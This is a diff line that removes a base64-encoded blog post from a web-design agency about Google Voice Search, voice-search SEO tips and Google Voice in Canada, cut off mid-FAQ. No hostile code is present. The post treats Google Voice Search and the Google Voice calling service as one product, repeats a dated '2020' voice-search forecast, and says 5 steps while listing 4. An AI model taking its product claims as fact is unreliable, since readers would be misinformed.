@@ -1,1 +1,175 @@
-{"data":"LS0tCnRpdGxlOiAiSGVyZeKAmXMgV2hhdCBZb3UgTmVlZCBUbyBLbm93IEFib3V0IEdvb2dsZSBWb2ljZSBTZWFyY2giCnNsdWc6ICJnb29nbGUtdm9pY2Utc2VhcmNoIgpkYXRlOiAiMjAyMy0xMS0xNiIKYXV0aG9yOiAiQ2FuYWRpYW4gV2ViIERlc2lnbnMiCmRlc2NyaXB0aW9uOiAiSGVyZeKAmXMgV2hhdCBZb3UgTmVlZCBUbyBLbm93IEFib3V0IEdvb2dsZSBWb2ljZSBTZWFyY2giCmtleXdvcmRzOiBbImdvb2dsZSB2b2ljZSBzZWFyY2giLCJCbG9nIl0KY2F0ZWdvcnk6ICJCbG9nIgpmZWF0dXJlZEltYWdlOiAiaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzExL0hlcmVzLVdoYXQtWW91LU5lZWQtVG8tS25vdy1BYm91dC1Hb29nbGUtVm9pY2UtU2VhcmNoLXNjYWxlZC5qcGciCi0tLQoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5Hb29nbGUgVm9pY2UgU2VhcmNoOiBVbnZlaWxpbmcgdGhlIEZ1dHVyZSBvZiBJbnRlcm5ldCBCcm93c2luZzwvaDI+Cgo8cD5BcyB3ZSBzdHJpZGUgZGVlcGVyIGludG8gdGhlIGRpZ2l0YWwgYWdlLCB0aGUgd2F5IHdlIGludGVyYWN0IHdpdGggdGVjaG5vbG9neSBpcyBjb250aW51b3VzbHkgZXZvbHZpbmcuIE9uZSBvZiB0aGUgc2lnbmlmaWNhbnQgc2hpZnRzIHdlIGFyZSB3aXRuZXNzaW5nIGlzIHRoZSByaXNlIG9mIHZvaWNlLWFjdGl2YXRlZCB0b29scy4gQW1vbmcgdGhlIGZyb250cnVubmVycyBpbiB0aGlzIGRldmVsb3BtZW50LCBHb29nbGUgVm9pY2UgU2VhcmNoIHN0YW5kcyBvdXQgYXMgYSBwcm9taXNpbmcgaW5ub3ZhdGlvbiBzaGFwaW5nIHRoZSBmdXR1cmUgb2YgaW50ZXJuZXQgYnJvd3NpbmcuIFRoaXMgaGFuZHMtZnJlZSBtZXRob2Qgb2Ygc3VyZmluZyB0aGUgaW50ZXJuZXQgb2ZmZXJzIGFuIHVucHJlY2VkZW50ZWQgbGV2ZWwgb2YgY29udmVuaWVuY2UgYW5kIGVmZmljaWVuY3kuIExldCdzIGRlbHZlIGRlZXBlciBpbnRvIHRoaXMgdGVjaG5vbG9naWNhbCBtYXJ2ZWwuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5UaGUgRXNzZW5jZSBvZiBHb29nbGUgVm9pY2UgU2VhcmNoPC9oMj4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtdW5kZXJzdGFuZGluZy1nb29nbGUtdm9pY2Utc2VhcmNoIj5VbmRlcnN0YW5kaW5nIEdvb2dsZSBWb2ljZSBTZWFyY2g8L2gzPgoKPHA+R29vZ2xlIFZvaWNlIFNlYXJjaCBpcyBhIGZlYXR1cmUgcHJvdmlkZWQgYnkgR29vZ2xlIHRoYXQgYWxsb3dzIHVzZXJzIHRvIG1ha2Ugc2VhcmNoIHF1ZXJpZXMgdXNpbmcgc3Bva2VuIGxhbmd1YWdlIHJhdGhlciB0aGFuIHR5cGluZy4gSXQncyBhcyBzaW1wbGUgYXMgc2F5aW5nLCAiT2theSwgR29vZ2xlIiBmb2xsb3dlZCBieSB0aGUgcXVlc3Rpb24gb3IgY29tbWFuZC4gVGhpcyB2b2ljZS1hY3RpdmF0ZWQgdGVjaG5vbG9neSBoYXMgYmVlbiBzZWFtbGVzc2x5IGludGVncmF0ZWQgaW50byBtb3N0IEdvb2dsZSBwbGF0Zm9ybXMsIGluY2x1ZGluZyBHb29nbGUgU2VhcmNoLCBHb29nbGUgTWFwcywgYW5kIEdvb2dsZSBBc3Npc3RhbnQuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5XaHkgR29vZ2xlIFZvaWNlIFNlYXJjaCBNYXR0ZXJzPC9oMz4KCjxwPjEuJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IEVhc2Ugb2YgVXNlOiBGb3IgdGhvc2Ugd2hvIGZpbmQgdHlwaW5nIHRlZGlvdXMgb3Igc2xvdywgR29vZ2xlIFZvaWNlIFNlYXJjaCBpcyBhIGdhbWUtY2hhbmdlci48L3A+Cgo8cD4yLiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyBBY2Nlc3NpYmlsaXR5OiBJdCdzIGEgYm9vbiBmb3IgcGVvcGxlIHdpdGggY2VydGFpbiBkaXNhYmlsaXRpZXMgdGhhdCBsaW1pdCBrZXlib2FyZCBvciBzY3JlZW4gdXNhZ2UuPC9wPgoKPHA+My4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgTXVsdGl0YXNraW5nOiBZb3UgY2FuIGNvbmR1Y3Qgc2VhcmNoZXMgd2l0aG91dCBpbnRlcnJ1cHRpbmcgb3RoZXIgYWN0aXZpdGllcy48L3A+Cgo8cD40LiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyBTcGVlZDogVm9pY2UgY29tbWFuZHMgYXJlIHByb2Nlc3NlZCBmYXN0ZXIgdGhhbiB0eXBlZCBxdWVyaWVzLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+TWF4aW1pemluZyB0aGUgVXNlIG9mIEdvb2dsZSBWb2ljZSBTZWFyY2g8L2gyPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1lbmhhbmNpbmctcGVyc29uYWwtZXhwZXJpZW5jZSI+RW5oYW5jaW5nIFBlcnNvbmFsIEV4cGVyaWVuY2U8L2gzPgoKPHA+R29vZ2xlIFZvaWNlIFNlYXJjaCBpcyBub3QgbWVyZWx5IGFib3V0IGNvbmR1Y3Rpbmcgc2VhcmNoZXMuIEl0J3MgYW4gYXZlbnVlIGZvciBzZXR0aW5nIHJlbWluZGVycywgc2VuZGluZyB0ZXh0cywgbWFraW5nIGNhbGxzLCBhbmQgY29udHJvbGxpbmcgc21hcnQgaG9tZSBkZXZpY2VzLiBXaXRoIHRoZSBpbnRlZ3JhdGlvbiBvZiBBSSwgaXQncyBsZWFybmluZyBhbmQgaW1wcm92aW5nIGZyb20gZXZlcnkgaW50ZXJhY3Rpb24uPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5MZXZlcmFnaW5nIGZvciBCdXNpbmVzc2VzPC9oMz4KCjxwPlZvaWNlIHNlYXJjaCBlc3NlbnRpYWxseSBhbGxvd3MgdXNlcnMgdG8gc3BlYWsgaW50byBhIGRldmljZSBhcyBvcHBvc2VkIHRvIHR5cGluZyBrZXl3b3JkcyB0byBnZW5lcmF0ZSByZXN1bHRzLjwvcD4KCjxwPkl0IHVzZXMgc3BlZWNoIHJlY29nbml0aW9uIGluIG9yZGVyIHRvIHVuZGVyc3RhbmQgd2hhdCB1c2VycyBhcmUgc2F5aW5nIHdpdGggZXh0cmVtZSBwcmVjaXNpb24uIEFmdGVyIHJlY2VpdmluZyBhIHNwZWVjaCwgaXQgYWxzbyBkZWxpdmVycyByZXN1bHRzIG9yYWxseSB0byB0aGUgdXNlci48L3A+Cgo8cD5BbHRob3VnaCBpdCBzZWVtcyBsaWtlIGEgYnJhbmQtbmV3IGNvbmNlcHQsIHZvaWNlIHNlYXJjaCB0ZWNobm9sb2d5IGhhcyBiZWVuIGFyb3VuZCBmb3Igc29tZSB0aW1lIG5vdy4gUHJvZ3JhbXMgc3VjaCBhcyBzcGVlY2gtdG8tdGV4dCBhbmQgdm9pY2UgZGlhbGluZyBhcmUgZ3JlYXQgZXhhbXBsZXMuPC9wPgoKPHA+WW91IG1heSBhbHJlYWR5IGtub3cgZXhhbXBsZXMgc3VjaCBhcyBHb29nbGUgQXNzaXN0YW50LCBTaXJpLCBNaWNyb3NvZnQgQ29ydGFuYSwgYW5kIEFtYXpvbiBBbGV4YSB0aGF0IGFsbCB1dGlsaXplIHZvaWNlIHNlYXJjaCBjYXBhYmlsaXRpZXMuPC9wPgoKPHA+QWx0aG91Z2ggc3BlY2lmaWMgZGV2aWNlcyBjYW4gYmUgb3B0aW1pemVkIGZvciB2b2ljZSBzZWFyY2gsIGJyYW5kcywgcGxhdGZvcm1zLCBhbmQgd2Vic2l0ZXMgY2FuIGJlIG9wdGltaXplZCBmb3IgaXQgYXMgd2VsbC48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLWhvdy12b2ljZS1zZWFyY2hlcy1pbXBhY3Qtc2VvLXJhbmtpbmdzIj48c3Ryb25nPkhvdyBWb2ljZSBTZWFyY2hlcyBJbXBhY3QgU0VPIFJhbmtpbmdzPC9zdHJvbmc+PC9oMj4KCjxwPlZvaWNlIHNlYXJjaCBkcmFzdGljYWxseSBpbXByb3ZlcyB1c2VyIGV4cGVyaWVuY2Ug4oCTIGFuZCBiZWNhdXNlIG9mIHRoYXQsIGJ5IHRoZSB5ZWFyIDIwMjAsIGhhbGYgb2YgYWxsIG9ubGluZSBzZWFyY2hlcyB3aWxsIGJlIG1hZGUgdGhyb3VnaCB2b2ljZSBzZWFyY2guPC9wPgoKPHA+RHVlIHRvIGl0cyBwcm9saWZpYyB1c2UsIEdvb2dsZSBpcyBwbGFjaW5nIGEgaGlnaGVyIGVtcGhhc2lzIG9uIHZvaWNlIHNlYXJjaCBvcHRpbWl6YXRpb24uPC9wPgoKPHA+QWZ0ZXIgYWxsLCB0aGUgcG9pbnQgb2YgU0VPIGlzIHRvIHJhbmsgd2Vic2l0ZXMgYWNjdXJhdGVseSBzbyB1c2VycyBjYW4gZmluZCB0aGUgYmVzdCBpbmZvcm1hdGlvbiBmb3IgdGhlaXIgc2VhcmNoIHF1ZXJ5IGFzIHF1aWNrbHkgYXMgcG9zc2libGUuIFVzZXIgZXhwZXJpZW5jZSBpcyBhdCB0aGUgZm9yZWZyb250IG9mIHNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uIGFzIGEgcmVzdWx0IG9mIHRoaXMgZmFjdC48L3A+Cgo8cD5CeSBKYW51YXJ5IDIwMTgsIHRoZXJlIHdhcyBhbiBhdmVyYWdlIG9mIDxhIGhyZWY9Imh0dHBzOi8vd3d3LndvcmRzdHJlYW0uY29tL2Jsb2cvd3MvMjAxOC8wNC8xMC92b2ljZS1zZWFyY2gtc3RhdGlzdGljcy0yMDE4IiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIiBhcmlhLWxhYmVsPSIgKG9wZW5zIGluIGEgbmV3IHRhYikiPm9uZSBiaWxsaW9uIHZvaWNlIHNlYXJjaGVzPC9hPiBldmVyeSBtb250aCwgcHJvdmluZyB0aGF0IGl0IGlzIG9uIHRoZSByaXNlLjwvcD4KCjxwPkJ1dCBpdCBpcyBpbXBvcnRhbnQgdG8gcmVtZW1iZXIgdGhhdCB2b2ljZSBzZWFyY2ggU0VPIGFuZCB0cmFkaXRpb25hbCB3ZWJzaXRlIFNFTyBhcmUgZGlmZmVyZW50LiBUaGVyZWZvcmUsIHNvbWUgZmFjdG9ycyB0aGF0IGFmZmVjdCB3ZWJzaXRlIHJhbmtpbmdzIG1heSBvciBtYXkgbm90IGhhdmUgdGhlIHNhbWUgZWZmZWN0IG9uIHZvaWNlIHNlYXJjaCDigJMgYW5kIHZpY2UgdmVyc2EuPC9wPgoKPHA+THVja2lseSwgdGhlcmUgYXJlIHNvbWUgdGlwcyB0aGF0IGNhbiBoZWxwIHlvdSBiYWxhbmNlIHRoZSB0d28gPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evb24tcGFnZS1vcHRpbWl6YXRpb24vIiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIj5TRU8gc3RyYXRlZ2llczwvYT4gYW5kIHJhbmsgeW91ciB3ZWJzaXRlIGZvciBsaXN0aW5ncyBhbmQgdm9pY2Ugc2VhcmNoLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtNC10aXBzLXRvLW9wdGltaXplLWZvci12b2ljZS1zZWFyY2giPjxzdHJvbmc+NCBUaXBzIFRvIE9wdGltaXplIEZvciBWb2ljZSBTZWFyY2g8L3N0cm9uZz48L2gyPgoKPHA+V2hlbiB1c2VycyB1c2Ugdm9pY2Ugc2VhcmNoLCB0aGV5IGFyZSB0eXBpY2FsbHkgaG9waW5nIHRvIGNvbXBsZXRlIGFuIGFjdGlvbiDigJMgc3VjaCBhcyBwbGF5aW5nIGEgc29uZyBvciBwdXJjaGFzaW5nIGEgcHJvZHVjdCDigJMgb3IgaW5mb3JtYXRpb24gb24gYSBzdWJqZWN0LjwvcD4KCjxwPkJ1dCBkZXNwaXRlIHRoZSB0d28gZGlmZmVyZW50IGludGVudGlvbnMsIEdvb2dsZSB1c2VzIHRoZSBzYW1lIGFsZ29yaXRobSB0byByYW5rIHNpdGVzLiBCZWxvdyBhcmUgNSBzaW1wbGUgc3RlcHMgdG8gaW1wcm92ZSByYW5raW5ncywgbm8gbWF0dGVyIHlvdXIgZ29hbC48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLTEtZW5zdXJlLXlvdXItd2Vic2l0ZS1sb2Fkcy1xdWlja2x5Ij48c3Ryb25nPjEuIEVuc3VyZSBZb3VyIFdlYnNpdGUgTG9hZHMgUXVpY2tseTwvc3Ryb25nPjwvaDM+Cgo8cD5KdXN0IGxpa2UgdHJhZGl0aW9uYWwgU0VPLCBHb29nbGUgVm9pY2UgU2VhcmNoZXMgZmF2b3JzIHdlYnNpdGVzIHRoYXQgbG9hZCBxdWlja2x5LiBFbnN1cmUgdGhhdDo8L3A+Cgo8dWw+CjxsaT5Zb3VyIHNpdGUgaXMgcmVzcG9uc2l2ZSBhbmQgd29ya3Mgd2VsbCBvbiBtb2JpbGUgZGV2aWNlcy48L2xpPgoKPGxpPkltYWdlcyBhcmUgb3B0aW1pemVkLjwvbGk+Cgo8bGk+RmlsZXMgYXJlIGNvbXByZXNzZWQuPC9saT4KCjxsaT5Zb3UgdXRpbGl6ZSB3ZWJzaXRlIGNhY2hpbmcgdG8gaW1wcm92ZSBwYWdlIHNwZWVkLjwvbGk+Cgo8bGk+WW91ciBzZXJ2ZXLigJlzIHJlc3BvbnNlIHRpbWUgaXMgcmVkdWNlZC48L2xpPgoKPGxpPkFuZCBvdGhlciB0YXNrcyB0aGF0IHNwZWVkIHVwIHRyYWRpdGlvbmFsIHdlYnNpdGVzLjwvbGk+CjwvdWw+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLTItd3JpdGUtdGhlLXdheS10aGF0LXlvdS1zcGVhayI+PHN0cm9uZz4yLiBXcml0ZSBUaGUgV2F5IFRoYXQgWW91IFNwZWFrPC9zdHJvbmc+PC9oMz4KCjxwPldoZW4gdXNlcnMgc2VhcmNoIGZvciBjb250ZW50IG9uIGRlc2t0b3Agb3IgbW9iaWxlLCB0aGV5IHRlbmQgdG8gd3JpdGUgaW4gc2hvcnQsIGFsbW9zdCBidWxsZXQtcG9pbnRlZCBwaHJhc2VzLiBGb3IgZXhhbXBsZSwgaWYgYSB1c2VyIHdhbnRlZCB0byBmaW5kIGEgZ3JlYXQgd2ViIGRlc2lnbmVyLCB0aGV5IGNvdWxkIHR5cGUg4oCcPGEgaHJlZj0iaHR0cHM6Ly93d3cuZGVzaWducnVzaC5jb20vYWdlbmN5L3dlYnNpdGUtZGVzaWduLWRldmVsb3BtZW50IiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIiBhcmlhLWxhYmVsPSIgKG9wZW5zIGluIGEgbmV3IHRhYikiPnRvcCB3ZWIgZGVzaWduIGNvbXBhbmllczwvYT7igJ0gaW50byBHb29nbGUuPC9wPgoKPHA+RW5zdXJlIHlvdXIgY29udGVudCBpcyBvcHRpbWl6ZWQgZm9yIHZvaWNlIHNlYXJjaGVzIGFzIHdlbGwsIGluY2x1ZGluZyB0aG9zZSBsb25nLXRhaWwga2V5d29yZHMgdGhhdCBzb3VuZCBtb3JlIG5hdHVyYWwgYXMgb3Bwb3NlZCB0byBzaG9ydGVyLCBzbmFwcGllciBrZXl3b3JkcyB0aGF0IHBlcmZvcm0gd2VsbCBpbiBkZXNrdG9wIFNFTy48L3A+Cgo8cD5QbHVzLCBrZWVwIHBocmFzZXMgc2hvcnQgYW5kIHNpbXBsZS4gUmVzdWx0cyBhcmUgdHlwaWNhbGx5IHdyaXR0ZW4gYXQgYSA5dGgtZ3JhZGUgcmVhZGluZyBsZXZlbCBhdDxlbT4gbW9zdDwvZW0+LiBTbywgYWx0aG91Z2ggeW91ciBpbmZvcm1hdGlvbiBtYXkgYmUgaGlnaC1sZXZlbCwgYnJlYWsgaXQgZG93biBpbiBhIHdheSB0aGF0IGlzIGVhc3kgZm9yIGFueW9uZSB0byBjb21wcmVoZW5kPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC0zLWluY2x1ZGUtZmVhdHVyZWQtYmxvY2tzLW9mLWNvbnRlbnQiPjxzdHJvbmc+My4gSW5jbHVkZSBGZWF0dXJlZCBCbG9ja3MgT2YgQ29udGVudDwvc3Ryb25nPjwvaDM+Cgo8cD5UaGUgYXZlcmFnZSByZXN1bHQgaXMgYWJvdXQgMjkgd29yZHMgbG9uZy4gQnV0IGFsdGhvdWdoIHdlIGtub3cgdGhhdCBzaG9ydGVyIGFuc3dlcnMgcGVyZm9ybSBiZXR0ZXIsIGhvdyBjYW4gd2UgZ3VhcmFudGVlIHRoZSBjb250ZW50IEdvb2dsZSB3aWxsIGlkZW50aWZ5IGFuZCByZWFkIHRvIHVzZXJzPzwvcD4KCjxwPkNyZWF0ZSBhIGZlYXR1cmVkIHNuaXBwZXQsIG9mIGNvdXJzZSE8L3A+Cgo8cD5BIGZlYXR1cmVkIHNuaXBwZXQg4oCTIGFsc28gY2FsbGVkIHBvc2l0aW9uIHplcm8sIGFuc3dlciBib3gsIG9yIHF1aWNrIGFuc3dlcnMg4oCTIGlzIGVzc2VudGlhbGx5IGEgc3VtbWFyeSBhbnN3ZXIgZnJvbSBhIHdlYiBwYWdlLiBJbiBkZXNrdG9wIHNlYXJjaCBsaXN0aW5ncywgdGhlc2Ugc25pcHBldHMgYXBwZWFyIGp1c3QgYWZ0ZXIgdGhlIHBhaWQgYWRzIGJ1dCBiZWZvcmUgdGhlIHJlZ3VsYXIgc2VhcmNoIGxpc3RpbmdzLjwvcD4KCjxwPlRvIG9wdGltaXplIHlvdXIgY29udGVudCBmb3IgYW4gaWRlbnRpZmlhYmxlIGZlYXR1cmVkIHNuaXBwZXQsIGluY2x1ZGUgYSBjb25jaXNlIHN1bW1hcnkgb2YgeW91ciBtYWluIGNvbnRlbnQgYWJvdmUgdGhlIGZvbGQgdW5kZXIgMjkgd29yZHMuPC9wPgoKPHA+U2VjdGlvbnMgdGhhdCB1c2UgSC10YWdzLCBsaXN0cywgYW5kIGJ1bGxldCBwb2ludHMgYXJlIGVhc2lseSByZWFkYWJsZSBieSBHb29nbGUgYW5kIHRodXMgcGVyZm9ybSB3ZWxsLiBQbHVzLCBiZSBzdXJlIHRvIGluY2x1ZGUgeW91ciBsb25nLXRhaWwga2V5d29yZHMgd2l0aGluIHRoZSBmZWF0dXJlZCBzbmlwcGV0LjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtNC1jb25jZW50cmF0ZS1vbi1sb2NhbC1zZWFyY2hlcyI+PHN0cm9uZz40LiBDb25jZW50cmF0ZSBPbiBMb2NhbCBTZWFyY2hlczwvc3Ryb25nPjwvaDM+Cgo8cD48YSBhcmlhLWxhYmVsPSIgKG9wZW5zIGluIGEgbmV3IHRhYikiIGhyZWY9Imh0dHBzOi8vc2VhcmNoZW5naW5lbGFuZC5jb20vdm9pY2Utc2VhcmNoLWV4cGxvc2lvbi13aWxsLWNoYW5nZS1sb2NhbC1zZWFyY2gtMjUxNzc2IiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIj4yMiU8L2E+IG9mIHZvaWNlIHNlYXJjaCBxdWVyaWVzIGFyZSBsb29raW5nIGZvciBsb2NhdGlvbi1iYXNlZCBjb250ZW50LiBUaGVyZWZvcmUsIGJyYW5kcyBoYXZlIGEgaGlnaGVyIGNoYW5jZSBvZiBwcm9kdWNpbmcgdm9pY2Ugc2VhcmNoIGNvbnRlbnQgaWYgdGhleSBpbnZlc3QgaW4gbG9jYWwgY29udGVudC4gVHJ5IHVzaW5nIHBocmFzZXMgbGlrZSDigJxuZWFyIG1l4oCdPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkdvb2dsZSBWb2ljZSBDYW5hZGE6IEZlYXR1cmVzIGFuZCBCZW5lZml0czwvc3Ryb25nPjwvaDI+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+V2h5IENhbmFkaWFucyBhcmUgTG92aW5nIEdvb2dsZSBWb2ljZTwvc3Ryb25nPjwvaDM+Cgo8b2wgdHlwZT0iMSIgc3RhcnQ9IjEiPgo8bGk+PHN0cm9uZz5VbmlmaWVkIENvbW11bmljYXRpb246PC9zdHJvbmc+IEdvb2dsZSBWb2ljZSBwcm92aWRlcyBhIHNpbmdsZSBwaG9uZSBudW1iZXIsIHJvdXRpbmcgaW5jb21pbmcgY2FsbHMgdG8gbXVsdGlwbGUgZGV2aWNlcyBpbmNsdWRpbmcgaG9tZSwgb2ZmaWNlLCBvciBtb2JpbGUgcGhvbmVzLjwvbGk+Cgo8bGk+PHN0cm9uZz5UcmFuc2NyaWJlZCBWb2ljZW1haWw6PC9zdHJvbmc+IEhhdGUgbGlzdGVuaW5nIHRvIGxlbmd0aHkgdm9pY2VtYWlscz8gR29vZ2xlIFZvaWNlIHRyYW5zY3JpYmVzIHRoZW0gc28geW91IGNhbiByZWFkIHRoZW0gbGlrZSB0ZXh0IG1lc3NhZ2VzLjwvbGk+Cgo8bGk+PHN0cm9uZz5JbnRlcm5hdGlvbmFsIENhbGxzOjwvc3Ryb25nPiBUaGUgc2VydmljZSBvZmZlcnMgY29tcGV0aXRpdmUgcmF0ZXMgZm9yIGludGVybmF0aW9uYWwgY2FsbGluZywgbWFraW5nIGl0IGEgZmF2b3JpdGUgZm9yIGJ1c2luZXNzZXMgYW5kIGluZGl2aWR1YWxzIGluIENhbmFkYS48L2xpPgoKPGxpPjxzdHJvbmc+SW50ZWdyYXRpb24gd2l0aCBPdGhlciBHb29nbGUgU2VydmljZXM6PC9zdHJvbmc+IElmIHlvdSdyZSB1c2luZyBHb29nbGUgV29ya3NwYWNlIG9yIG90aGVyIEdvb2dsZSBhcHBzLCBpbnRlZ3JhdGlvbiBpcyBhIGJyZWV6ZS48L2xpPgo8L29sPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkhvdyBpdCBTdGFuZHMgT3V0IGluIHRoZSBDYW5hZGlhbiBNYXJrZXQ8L3N0cm9uZz48L2gyPgoKPHA+V2l0aCB2YXJpb3VzIFZvSVAgc2VydmljZXMgYXZhaWxhYmxlLCBHb29nbGUgVm9pY2UgaW4gQ2FuYWRhIGhhcyBjYXJ2ZWQgb3V0IGEgbmljaGUgZm9yIGl0c2VsZiBkdWUgdG86PC9wPgoKPHVsPgo8bGk+PHN0cm9uZz5Vc2VyLWZyaWVuZGx5IEludGVyZmFjZTo8L3N0cm9uZz4gRXZlbiBmb3IgdGhlIG5vbi10ZWNoIHNhdnZ5IGluZGl2aWR1YWxzLjwvbGk+Cgo8bGk+PHN0cm9uZz5SZWxpYWJpbGl0eTo8L3N0cm9uZz4gR29vZ2xlJ3Mgcm9idXN0IGluZnJhc3RydWN0dXJlIGVuc3VyZXMgbWluaW1hbCBkb3dudGltZS48L2xpPgoKPGxpPjxzdHJvbmc+Q29zdCBTYXZpbmdzOjwvc3Ryb25nPiBFc3BlY2lhbGx5IHdoZW4gY29tcGFyZWQgdG8gdHJhZGl0aW9uYWwgdGVsZXBob255IHNlcnZpY2VzLjwvbGk+CjwvdWw+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+VW5kZXJzdGFuZGluZyBHb29nbGUgVm9pY2UgaW4gQ2FuYWRhJ3MgTGltaXRhdGlvbnM8L3N0cm9uZz48L2gyPgoKPHA+V2hpbGUgdGhlcmUgYXJlIG1hbnkgYmVuZWZpdHMsIGl0J3MgY3J1Y2lhbCB0byB1bmRlcnN0YW5kIHRoYXQgR29vZ2xlIFZvaWNlIGluIENhbmFkYSBhbHNvIGhhcyBpdHMgbGltaXRhdGlvbnM6PC9wPgoKPG9sIHR5cGU9IjEiIHN0YXJ0PSIxIj4KPGxpPjxzdHJvbmc+RW1lcmdlbmN5IENhbGxzOjwvc3Ryb25nPiBHb29nbGUgVm9pY2UgaXNuJ3QgYSByZXBsYWNlbWVudCBmb3IgeW91ciB0cmFkaXRpb25hbCBwaG9uZSBzZXJ2aWNlLCBwYXJ0aWN1bGFybHkgaW4gZW1lcmdlbmN5IHNpdHVhdGlvbnMuPC9saT4KCjxsaT48c3Ryb25nPlBvcnRpbmcgRGVsYXlzOjwvc3Ryb25nPiBUcmFuc2ZlcnJpbmcgb3IgInBvcnRpbmciIHlvdXIgY3VycmVudCBudW1iZXIgdG8gR29vZ2xlIFZvaWNlIG1pZ2h0IGNvbWUgd2l0aCBzb21lIHdhaXRpbmcgdGltZS48L2xpPgoKPGxpPjxzdHJvbmc+TGltaXRlZCBCdXNpbmVzcyBGZWF0dXJlczo8L3N0cm9uZz4gTGFyZ2UgZW50ZXJwcmlzZXMgbWlnaHQgZmluZCBjZXJ0YWluIGFkdmFuY2VkIGZlYXR1cmVzIG1pc3Npbmc8L2xpPgo8L29sPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1pcy1nb29nbGUtdm9pY2UtYXZhaWxhYmxlLWluLWNhbmFkYSI+PHN0cm9uZz5JcyBHb29nbGUgVm9pY2UgYXZhaWxhYmxlIGluIENhbmFkYT88L3N0cm9uZz48L2gyPgoKPHA+R29vZ2xlIFZvaWNlLCBpbml0aWFsbHkgbGF1bmNoZWQgZXhjbHVzaXZlbHkgaW4gdGhlIFVuaXRlZCBTdGF0ZXMsIGhhcyBvZnRlbiBiZWVuIGluIGRlbWFuZCBieSBpbmRpdmlkdWFscyBpbiBvdGhlciBjb3VudHJpZXMuIEdvb2dsZSBWb2ljZSBoYWQgZXhwYW5kZWQgaXRzIGF2YWlsYWJpbGl0eSwgYW5kIHllcywgQ2FuYWRhIHdhcyBhbW9uZyB0aGUgcmVnaW9ucyB3aGVyZSB0aGlzIHNlcnZpY2Ugd2FzIGFjY2Vzc2libGUuIENhbmFkaWFucyBjYW4gbm93IGVuam95IG1hbnkgb2YgdGhlIGZlYXR1cmVzIHRoYXQgQW1lcmljYW5zIGhhdmUgYmVlbiB1c2luZywgaW5jbHVkaW5nIHZvaWNlbWFpbCB0cmFuc2NyaXB0aW9uLCBjYWxsIGZvcndhcmRpbmcsIGFuZCB0aGUgYWJpbGl0eSB0byB1c2UgYSBzaW5nbGUgbnVtYmVyIGFjcm9zcyBtdWx0aXBsZSBkZXZpY2VzLiBIb3dldmVyLCBpdCdzIGVzc2VudGlhbCB0byBwZXJpb2RpY2FsbHkgY2hlY2sgR29vZ2xlJ3Mgb2ZmaWNpYWwgYW5ub3VuY2VtZW50cyBvciB0aGUgR29vZ2xlIFZvaWNlIHdlYnNpdGUgZm9yIGFueSBjaGFuZ2VzLCByZWdpb25hbCBudWFuY2VzLCBvciBhZGRpdGlvbmFsIHNlcnZpY2VzIHRoZXkgbWlnaHQgaW50cm9kdWNlIGluIENhbmFkYSBvciBvdGhlciBhcmVhcy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPkZBUXMgQWJvdXQgR29vZ2xlIFZvaWNlIFNlYXJjaDwvaDI+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPkhvdyBSZWxpYWJsZSBpcyBHb29nbGUgVm9pY2UgU2VhcmNoIGluIENhbmFkYT88L2gzPgoKPHA+R29vZ2xlIFZvaWNlIFNlYXJjaCBpcyBiYWNrZWQgYnkgYWR2YW5jZWQgc3BlZWNoIHJlY29nbml0aW9uIHRlY2hub2xvZ3ksIG1ha2luZyBpdCBoaWdobHkgYWNjdXJhdGUuIEhvd2V2ZXIsIGl0IGNhbiBzb21ldGltZXMgc3RydWdnbGUgd2l0aCBzdHJv